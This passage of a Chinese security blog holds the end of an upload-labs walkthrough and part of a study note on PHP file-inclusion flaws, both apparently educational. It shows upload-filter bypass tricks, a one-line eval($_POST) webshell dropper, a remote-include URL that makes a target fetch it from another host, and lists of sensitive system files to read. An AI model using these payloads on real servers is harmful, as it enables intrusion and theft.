&#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将pass-05的源码与pass-04的对比：</p><p><a href="https://imgchr.com/i/kw5Jpt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kw5Jpt.md.png" alt="kw5Jpt.md.png"></a></p><p>发现pass-05多过滤了<code>.htaccess</code>文件，但是没有将读出的后缀名进行统一转换为小写，所以可以直接构造<code>.Php</code>后缀的文件进行上传即可；</p><p><a href="https://imgchr.com/i/kw5ypq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kw5ypq.md.png" alt="kw5ypq.md.png"></a></p><p>访问成功：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw5RnU.png" alt="kw5RnU.png"></p><h3 id="pass-06-空格绕过"><a href="#pass-06-空格绕过" class="headerlink" title="pass-06-空格绕过"></a>pass-06-空格绕过</h3><p>查看源码，与pass-05进行对比：</p><p><a href="https://imgchr.com/i/kwTBAe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kwTBAe.md.png" alt="kwTBAe.md.png"></a></p><p>对后缀进行了小写转换，但是从头到尾没有添加对文件名的首尾去空处理，所以直接在文件后缀后面加上空格即可绕过；</p><p>上传成功：</p><p><a href="https://imgchr.com/i/kwT5NQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kwT5NQ.md.png" alt="kwT5NQ.md.png"></a></p><p>访问成功：</p><p><a href="https://imgchr.com/i/kwT73n" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/12/kwT73n.png" alt="kwT73n.png"></a></p><h3 id="pass-07-点绕过"><a href="#pass-07-点绕过" class="headerlink" title="pass-07-点绕过"></a>pass-07-点绕过</h3><p>对比pass-06的源码：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw7R2R.png" alt="kw7R2R.png"></p><p>发现这次是缺少了<code>$file_name = deldot($file_name);</code>删除文件名末尾的点这一步的操作；</p><p>于是想到在文件后缀最后加上<code>.</code>来绕过判断，成功上传：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw77Ie.png" alt="kw77Ie.png"></p><p>成功访问：</p><p><img src="https://s2.ax1x.com/2019/02/12/kw7qGd.png" alt="kw7qGd.png"></p><h3 id="pass-08-DATA绕过"><a href="#pass-08-DATA绕过" class="headerlink" title="pass-08-::$DATA绕过"></a>pass-08-::$DATA绕过</h3><p>这次经过对比，源码中缺少的是如下语句：</p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);</code>用来去除字符串::$DATA；所以这次可以直接构造<code>gardenia.php::$DATA</code>来绕过源码中的过滤；上传成功如下：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0abrV.png" alt="k0abrV.png"></p><p>访问成功：</p><p><a href="https://imgchr.com/i/k0dwLV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0dwLV.md.png" alt="k0dwLV.md.png"></a></p><h3 id="pass-09-二次绕过"><a href="#pass-09-二次绕过" class="headerlink" title="pass-09-二次绕过"></a>pass-09-二次绕过</h3><p>审计源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次源码似乎挺正常，没有前面几处的缺失，一开始也是没有想到可以这样绕过，后来经过思考，发现源码对后缀名只是进行了一个轮次的处理，如果逆向思考，构造一个后缀，经过这一轮处理以后还是可以绕过呢？于是构造<code>gardenia.php. .</code>，经过去点，去空处理后得到<code>gardenia.php.</code>相当于点绕过；</p><p>上传成功：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0BCMn.png" alt="k0BCMn.png"></p><p>访问成功：</p><p><img src="https://s2.ax1x.com/2019/02/13/k00r8J.png" alt="k00r8J.png"></p><h3 id="pass-10-双写绕过"><a href="#pass-10-双写绕过" class="headerlink" title="pass-10-双写绕过"></a>pass-10-双写绕过</h3><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>是关键点，将文件名中出现的带有黑名单的部分替换为空；</p><p>测试脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $black=<span class="string">"php"</span>;</span><br><span class="line">    $filename=<span class="string">"gardenia.pphphp"</span>;</span><br><span class="line">    $ans=str_ireplace($black,<span class="string">""</span>,$filename);</span><br><span class="line">    <span class="keyword">echo</span> $ans;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运行结果：gardenia.php</span><br></pre></td></tr></table></figure><p>如上，直接双写构造<code>gardenia.pphphp</code>即可；</p><p><a href="https://imgchr.com/i/k0s6JO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0s6JO.md.png" alt="k0s6JO.md.png"></a></p><p>访问成功：</p><p><a href="https://imgchr.com/i/k0sRQH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0sRQH.md.png" alt="k0sRQH.md.png"></a></p><h3 id="pass-11-00截断-GET"><a href="#pass-11-00截断-GET" class="headerlink" title="pass-11-00截断(GET)"></a>pass-11-00截断(GET)</h3><p>审计一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看关键源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>发现是得到合法后缀名后给定一个<code>$img_path</code>的文件存储路径，构成方法如上，需要GET一个<code>save_path</code>，但是不知道在哪GET…，没办法抓个包试试，发现了GET的参数；</p><p><a href="https://imgchr.com/i/k0ID0S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0ID0S.md.png" alt="k0ID0S.md.png"></a></p><p>直接修改GET参数即可，构造payload如下；</p><p><img src="https://s2.ax1x.com/2019/02/13/k0I6Yj.png" alt="k0I6Yj.png"></p><p><code>%00</code>为url编码的00，可以使<code>$img_path</code>的值从<code>00</code>结束，所以文件的最终路径为<code>../upload/gardenia.php</code>可以解析为php脚本；运行成功如下：</p><p><a href="https://imgchr.com/i/k0I7tJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/13/k0I7tJ.md.png" alt="k0I7tJ.md.png"></a></p><ul><li><strong>Attention：</strong>需要特别注意的是00截断的前提：</li></ul><ol><li>php版本小于5.3.4；</li><li>php.ini的<code>magic_quotes_gpc</code>为Off状态；</li></ol><h3 id="pass-12-00截断-POST"><a href="#pass-12-00截断-POST" class="headerlink" title="pass-12-00截断(POST)"></a>pass-12-00截断(POST)</h3><p>和pass-11几乎一毛一样，就是从GET变成了POST而已，直接放上payload：</p><p><img src="https://s2.ax1x.com/2019/02/13/k0oGuV.png" alt="k0oGuV.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;从打完校赛开始到现在，身为萌新，寒假就研究了一下文件上传这部分内容，还是自己动手实践一下比较好，还可以学学代码审计；
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="upload" scheme="https://gardenia30.top/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>Web安全-文件包含漏洞学习笔记</title>
    <link href="https://gardenia30.top/2019/02/10/%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>https://gardenia30.top/2019/02/10/包含漏洞/</id>
    <published>2019-02-10T07:44:21.000Z</published>
    <updated>2019-11-12T07:46:07.238Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初衷是灵活方便，殊不知方便永远是安全最大的敌人。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>开发人员通常会把可以重复使用的函数写到单个文件里，在使用某些函数时，直接调用此文件即可，无需再次编写，这种调用文件的过程一般被称为文件包含，但是正因为这种灵活性，导致客户端可以调用一个恶意文件，造成文件包含漏洞；PHP的文件包含功能太强大，所以文件包含漏洞很多，但是其他语言也是有这种漏洞的；</p><h2 id="PHP包含"><a href="#PHP包含" class="headerlink" title="PHP包含"></a>PHP包含</h2><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include()</span><br><span class="line">include_once()</span><br><span class="line">require()</span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure><ul><li><code>include()</code>找不到被包含的文件时只会产生警告，脚本将继续执行；</li><li><code>include_once()</code>与<code>include()</code>类似，区别就是如果该文件中的代码已经被包含就不会再次包含；</li><li><code>require()</code>找不到被包含文件时会产生致命错误，脚本停止运行；</li><li><code>require_once()</code>与<code>require()</code>类似，区别就是如果该文件中的代码已经被包含就不会再次包含；</li></ul><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><h4 id="1-包含有php标准语法的源文件"><a href="#1-包含有php标准语法的源文件" class="headerlink" title="1.包含有php标准语法的源文件"></a>1.包含有php标准语法的源文件</h4><p>文件include.php</p><p><a href="https://s2.ax1x.com/2019/05/04/EdyMuQ.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/EdyMuQ.png" alt="EdyMuQ.png"></a></p><p>文件hacker.txt</p><p><a href="https://s2.ax1x.com/2019/05/04/Edye9f.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/Edye9f.png" alt="Edye9f.png"></a></p><p>访问页面：</p><p><a href="https://s2.ax1x.com/2019/05/04/EdylHs.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/EdylHs.png" alt="EdylHs.png"></a></p><p>将包含的文件扩展名改为<code>rar,doc,jpg,xxx</code>都可以显示phpinfo的信息；由此看出如果包含的文件是php的语法规范时输出php代码运行结果；</p><h4 id="2-包含非php语法规范的源文件"><a href="#2-包含非php语法规范的源文件" class="headerlink" title="2.包含非php语法规范的源文件"></a>2.包含非php语法规范的源文件</h4><p>hacker.txt:</p><p><a href="https://s2.ax1x.com/2019/05/04/EdyH8f.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/EdyH8f.png" alt="EdyH8f.png"></a></p><p>输出页面：</p><p><a href="https://s2.ax1x.com/2019/05/04/EdyXrQ.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/04/EdyXrQ.png" alt="EdyXrQ.png"></a></p><p>由此看出非php语法规范时，输出源码；</p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>php不仅可以包含本地文件，还可以直接对远程主机上的文件进行包含，远程文件包含与本地文件包含没有本质区别，无论是哪种扩展名，只要遵循php语法规范解析器就会对其进行解析，但是产生的条件比较苛刻，需要以下两个参数全部为on的情况下才可以包含成功</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; allow_url_include = On&gt; allow_url_fopen = On&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p><a href="https://s2.ax1x.com/2019/05/31/Vl5jwF.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/31/Vl5jwF.png" alt="Vl5jwF.png"></a></p><h4 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h4><blockquote><p>This option allows the use of URL-aware fopen wrappers with the following<br>functions: include，include_once    </p></blockquote><h4 id="allow-url-fopen"><a href="#allow-url-fopen" class="headerlink" title="allow_url_fopen"></a>allow_url_fopen</h4><blockquote><p>本选项激活了 URL 形式的 fopen 封装协议使得可以访问 URL对象例如文件。默认的封装协议提供用 ftp 和 http 协议来访问远程文件，一些扩展库例如zlib 可能会注册更多的封装协议</p></blockquote><p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p><h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><p>在本机根目录放上include.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file=$_GET[&apos;file&apos;];</span><br><span class="line">    include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在远程服务器上放上需要包含的文件hack.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &apos;hacked by Gard3nia 2333333~~~~~&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>尝试远程文件包含成功：</p><p><a href="https://s2.ax1x.com/2019/05/31/Vlb9rq.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/31/Vlb9rq.png" alt="Vlb9rq.png"></a></p><p><a href="https://s2.ax1x.com/2019/05/31/Vlb9rq.png" target="_blank" rel="noopener">Vlb9rq.png</a></p><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><ol><li>具有相关包含的函数；</li><li>文件包含中存在动态变量如<code>include $file;</code>；</li><li>文件包含中的动态变量可控；</li></ol><h3 id="PHP文件包含的利用"><a href="#PHP文件包含的利用" class="headerlink" title="PHP文件包含的利用"></a>PHP文件包含的利用</h3><h4 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1.读取敏感文件"></a>1.读取敏感文件</h4><ul><li>Linux系统(实测ubuntu)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd                                 //用户</span><br><span class="line">/etc/apache2/apache2.conf                  //apache2配置文件</span><br><span class="line">/etc/php/php.ini                          //php配置文件</span><br><span class="line">/etc/mysql/my.cnf                        //mysql配置文件</span><br></pre></td></tr></table></figure><p><a href="https://s2.ax1x.com/2019/05/31/VlLuE6.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/31/VlLuE6.png" alt="VlLuE6.png"></a></p><p><a href="https://s2.ax1x.com/2019/05/31/VlLlCD.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/05/31/VlLlCD.png" alt="VlLlCD.png"></a></p><ul><li><p>Windows系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini</span><br><span class="line">c:\windows\systems32\inetsrv\MetaBase.xml</span><br><span class="line">c:\windows\repair\sam</span><br><span class="line">c:\windows\php.ini             php配置文件</span><br><span class="line">c:\windows\my.ini               mysql配置文件</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-远程包含Shell"><a href="#2-远程包含Shell" class="headerlink" title="2.远程包含Shell"></a>2.远程包含Shell</h4><p>​    如果主机的<code>allow_url_fopen</code>选项是激活的，那么就可以尝试远程包含一句话木马，先在远程服务器的根目录放上生成一句话的txt文件kk.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&quot;kk&quot;]);?&gt;&apos;)?&gt;</span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.175.1/include.php?file=http://192.168.175.173/kk.txt</span><br></pre></td></tr></table></figure><p>在<code>include.php</code>的同级目录下会生成Webshell，直接连接Antsword即可Getshell；</p><h4 id="3-本地包含配合文件上传"><a href="#3-本地包含配合文件上传" class="headerlink" title="3.本地包含配合文件上传"></a>3.本地包含配合文件上传</h4><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传，上传一个图片木马kk.jpg，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&quot;kk&quot;]);?&gt;&apos;)?&gt;</span><br></pre></td></tr></table></figure><p>访问url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.175.1/include.php?file=http://192.168.175.173/upload/kk.jpg</span><br></pre></td></tr></table></figure><p>即可在同级目录下生成Webshell</p><h4 id="4-使用PHP封装协议"><a href="#4-使用PHP封装协议" class="headerlink" title="4.使用PHP封装协议"></a>4.使用PHP封装协议</h4><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">file://</td><td style="text-align:center">访问本地文件系统</td></tr><tr><td style="text-align:center">http://</td><td style="text-align:center">访问网址</td></tr><tr><td style="text-align:center">ftp://</td><td style="text-align:center">访问ftp urls</td></tr><tr><td style="text-align:center">php://</td><td style="text-align:center">访问输入输出流</td></tr><tr><td style="text-align:center">zlib://</td><td style="text-align:center">压缩流</td></tr><tr><td style="text-align:center">data://</td><td style="text-align:center">数据流</td></tr><tr><td style="text-align:center">ssh2://</td><td style="text-align:center">Secure Shell 2</td></tr><tr><td style="text-align:center">expect://</td><td style="text-align:center">处理交互式的流</td></tr><tr><td style="text-align:center">glob://</td><td style="text-align:center">查找匹配的文件路径</td></tr><tr><td style="text-align:center">phar://</td><td style="text-align:center">PHP归档</td></tr><tr><td style="text-align:center">rar://</td><td style="text-align:center">RAR</td></tr></tbody></table><ul><li><p>file://</p><p>通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响，只需要文件路径即可，先上include.php源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file=$_GET[&apos;file&apos;];</span><br><span class="line">    include($file);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>用file协议流读取本地文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://D:/PHPstudy/PHPTutorial/WWW/gardenia.txt</span><br></pre></td></tr></table></figure><p>成功回显：</p><p><a href="https://s2.ax1x.com/2019/06/02/VGcdmD.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/06/02/VGcdmD.png" alt="img"></a></p></li><li><p>php://</p><p>在CTF中经常使用的是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter     //在双off的情况下也可以正常使用；</span><br><span class="line">php://input      //需要开启allow_url_include</span><br></pre></td></tr></table></figure><p>1.使用封装协议读PHP文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read= 或 write= 作前缀 